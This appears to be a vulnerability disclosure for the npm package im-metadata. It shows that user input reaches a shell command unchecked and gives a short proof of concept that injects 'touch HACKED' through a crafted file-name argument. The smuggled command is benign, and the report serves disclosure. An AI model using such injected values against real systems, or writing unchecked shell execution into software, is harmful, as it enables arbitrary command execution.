
The issue occurs because a user input is formatted inside a command that will be executed without any check. The issue arises [here](https://github.com/Turistforeningen/node-im-metadata/blob/master/index.js#L39).
## Proof of Concept (Credit: [Mik317](https://huntr.dev/app/users/Mik317))
1. Create the following PoC file:

```js
// poc.js
var metadata = require('im-metadata');
metadata('test; touch HACKED; #', {}, function(){})

```
2. Check there aren't files called `HACKED`.
3. Execute the following commands in another terminal:

```bash
npm i im-metadata # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files - now `HACKED` has been created.

## References
- [GitHub Issue](https://github.com/Turistforeningen/node-im-metadata/issues/11)